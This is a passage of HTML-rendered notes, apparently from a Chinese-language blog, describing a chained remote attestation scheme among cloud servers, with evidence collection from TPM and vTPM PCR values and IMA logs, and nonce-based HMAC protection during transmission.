style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>云服务器的远程验证顺序为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mi>i</mi></msub><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msub><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mi>n</mi></msub></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(8)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">CS_1\xrightarrow{\text{validate}}CS_2\xrightarrow{\text{validate}}...\xrightarrow{\text{validate}}CS_i\xrightarrow{\text{validate}}...\xrightarrow{\text{validate}}CS_{n-1}\xrightarrow{\text{validate}}CS_n\tag8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1191em;vertical-align:-0.011em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1191em;vertical-align:-0.011em;"></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.3164em;vertical-align:-0.2083em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.3581em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">8</span></span><span class="mord">)</span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1\leq i\leq n - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7955em;vertical-align:-0.136em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，最后 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mi>n</mi></msub><mover><mo stretchy="true" minsize="3.0em">→</mo><mpadded width="+0.6em" lspace="0.3em"><mtext>validate</mtext></mpadded></mover><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">CS_{n}\xrightarrow{\text{validate}}CS_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2581em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel x-arrow"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1081em;"><span style="top:-3.322em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight x-arrow-pad"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">validate</span></span></span></span></span><span class="svg-align" style="top:-2.689em;"><span class="pstrut" style="height:2.7em;"></span><span class="hide-tail" style="height:0.522em;min-width:1.469em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="0.522em" viewBox="0 0 400000 522" preserveAspectRatio="xMaxYMin slice"><path d="M0 241v40h399891c-47.3 35.3-84 78-110 128-16.7 32-27.7 63.7-33 95 0 1.3-.2 2.7-.5 4-.3 1.3-.5 2.3-.5 3 0 7.3 6.7 11 20 11 8 0 13.2-.8 15.5-2.5 2.3-1.7 4.2-5.5 5.5-11.5 2-13.3 5.7-27 11-41 14.7-44.7 39-84.5 73-119.5s73.7-60.2 119-75.5c6-2 9-5.7 9-11s-3-9-9-11c-45.3-15.3-85-40.5-119-75.5s-58.3-74.8-73-119.5c-4.7-14-8.3-27.3-11-40-1.3-6.7-3.2-10.8-5.5-12.5-2.3-1.7-7.5-2.5-15.5-2.5-14 0-21 3.7-21 11 0 2 2 10.3 6 25 20.7 83.3 67 151.7 139 205zm0 0v40h399900v-40z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.011em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><strong>Attestation Process</strong></p><p>远程认证过程可分为三个步骤：收集、传输和验证证据信息，如图。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123141618906.png" alt="image-20241123141618906"></p><ul><li><p>信息收集</p><p>图中红色虚线为信息收集部分，以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">CS_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>为例，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">CS_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>作为验证者，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>S</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">CS2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">CS</span><span class="mord">2</span></span></span></span>作为证明者。</p><ol><li>验证器主机层的验证代理（Attestation Agent,<code>AA</code>）向<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">CS_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>虚拟机监控器（Virtual Machine Monitor,<code>VMM</code>）层的传输代理（Transit Agent,<code>TA</code>）发送远程验证请求。<code>TA</code>向主机及其托管的所有虚拟机中的<code>ICA</code>并行发起信息收集请求。</li><li><code>ICA</code>使用TPM_TOOLS收集证据信息，包括来自<code>TPM</code>和<code>vTPM</code>的<code>PCR</code>值以及云服务器和虚拟机中<code>IMA</code>的测量日志（<code>ML</code>、<code>vML</code>）。</li></ol></li><li><p>Transmitting the information</p><p>信息收集完成后<code>TA</code>就会汇总从所有运行的虚拟机收集到的证据并加密，然后将数据传输给验证器中的<code>AA</code>，如步骤3所示。</p><p>如下图描述了从 TA 向 AA 传输证据信息的详细过程。</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123165336646.png" alt="image-20241123165336646"></p><p>首先，<code>TA</code>向<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">CS_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上的所有<code>ICA</code>并行发送信息收集请求，每个请求都包含不可预测的随机数（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">nonce</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal">ce</span></span></span></span>）。</p><p>然后，虚拟机中的<code>ICA</code>根据公式(9)生成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">vPCR_{2j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>的哈希的消息验证码(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">HMAC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>)。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>v</mi><mi>P</mi><mi>C</mi><msubsup><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mo>=</mo><mi>H</mi><mi>M</mi><mi>A</mi><mi>C</mi><mo stretchy="false">(</mo><mi>v</mi><mi>P</mi><mi>C</mi><msub><mi>R</mi><mrow><mn>2</mn><mi>j</mi></mrow></msub><mo separator="true">,</mo><mi>n</mi><mi>o</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(9)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">vPCR&#x27;_{2j}=HMAC(vPCR_{2j},nonce)\tag9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.185em;vertical-align:-0.3831em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal" style="margin-right:0.07153em;">PC</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-2.453em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight" 